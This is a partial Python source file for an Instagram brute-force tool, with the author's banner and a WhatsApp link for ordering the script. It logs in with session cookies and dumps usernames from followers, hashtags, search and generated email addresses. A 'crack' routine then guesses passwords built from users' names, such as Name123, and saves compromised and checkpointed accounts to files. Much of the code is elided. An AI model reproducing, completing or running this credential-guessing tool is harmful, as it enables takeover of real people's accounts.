...
{K}╚═════════════════════════════════╝
{M}╔═════════════════════════════════╗
{M}║ {P}MULTI BRUTEFORCE INSTAGRAM      {M}║ 
{M}║ {K}Author   : MUN-4W4N1            {M}║
{M}║ {K}GitHub   : github.com/MN4WN1-777{M}║
{M}║ {K}Facebook : kemas.rifki.75       {M}║
{M}╚═════════════════════════════════╝{M}
""")
def xoshnaw(): 
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      print("\x1b[1;93mSILAHKAN COPY ID ANDA KIRIM KE AUTHOR !!!") 
      os.system('xdg-open https://wa.me/+6282277004825?text=Bg+Saya+Mau+Order+Sc+Lu+Bg') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def ___login___():
    ...
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{K}[{P}!{K}]{P} You will be directed to the creator of this program !!!");sleep(3);os.system('xdg-open https://wa.me/+6282277004825?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?');exit()
    elif ___cookie in ['', ' ']:
        ...
        try:
            ...
            exit(f"{P}[{M}!{P}]{M} Make Sure Cookie Arw Fresh")
    ...
    try:
        ...
        with requests.Session() as ses:
            ...
            if '"status":"ok"' in str(___follow):
                print(f"{H}[{P}!{H}]{P} Login Success");___menu___()
            else:
...
def ___menu___():
    try:
        ...
        exit(f"{P}[{K}!{P}]{K} Connection Error")
    print(f"{B}[{P}1{B}]{H} Dump Username From Following")
    print(f"{B}[{P}2{B}]{H} Dump Username From Followers")
    print(f"{B}[{P}3{B}]{H} Dump Username From Activity")
    print(f"{B}[{P}4{B}]{H} Dump Username From Home")
    print(f"{B}[{P}5{B}]{H} Dump Username From Hashtag")
    print(f"{B}[{P}6{B}]{H} Dump Username From Search")
    print(f"{B}[{P}7{B}]{H} Dump Username From Query")
    print(f"{B}[{P}8{B}]{H} Dump User From Email")
    print(f"{B}[{P}9{B}]{K} Start Crack {P}[{H}Fast{P}]{H}")
    print(f"{B}[{P}0{B}]{H} List Total Crack")
    print(f"{B}[{P}A{B}]{H} Log out {P}[{M}Exit{P}]{M}\n")
...
def ___mengikuti___():
    try:
        ...
        with requests.Session() as ses:
            ...
            print(f"\n{B}[{P}*{B}]{P} Finished...")
            print(f"{B}[{P}?{B}]{P} File Saved In :{K} Dump/{___file}")
...
def ___hastag___():
    try:
        ...
        if ___tag in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Fill")
        ___file = input(f"{H}[{P}?{H}]{P} Name File :{K} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Fill")
        else:
            print(f"{P} ")
    ...
    try:
        ...
        with requests.Session() as ses:
            ...
            for z in ___zak['users']:
                ...
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{H}[{P}*{H}]{P} Finished...")
            print(f"{H}[{P}?{H}]{P} File Saved In :{K} Dump/{___file}")
            input(f"{M}[{P}Return{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Failed")
    except (ConnectionError):
        ...
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ...
            if ___limit >=1001:
                ...
                for _ in range(___limit):
                    ...
                    print(f"{___user}")
                print(f"\n{B}[{P}*{B}]{P} Finished...")
                print(f"{B}[{P}?{B}]{P} File Saved in :{K} {___file}")
                input(f"{M}[{P}Return{M}]{P}");___menu___()
        else:
...
class ___crack___:
    ...
    def __init__(self):
        ...
        self.ok = []
        self.cp = []
        print(f"\n{H}[{P}1{H}]{P} Enter Password {H}[{K}Name, Name123, Name12345{H}]{K}")
        print(f"{H}[{P}2{H}]{P} Enter Password {H}[{K}name, name123, name1234, name12345{H}]{K}")
        print(f"{H}[{P}3{H}]{P} Enter Password {H}[{K}name, name123, name1234, name12345, name321{H}]{K}")
        print(f"{H}[{P}4{H}]{P} Enter Password Manual {H}[{K}>5{H}]{K}\n")
        ...
        try:
            print(f"\n{H}[{P}•{H}]{P} Total Ok Saved Di Results/Ok.txt")
            print(f"{H}[{P}•{H}]{P} Total Cp Saved Di Results/Cp.txt\n")
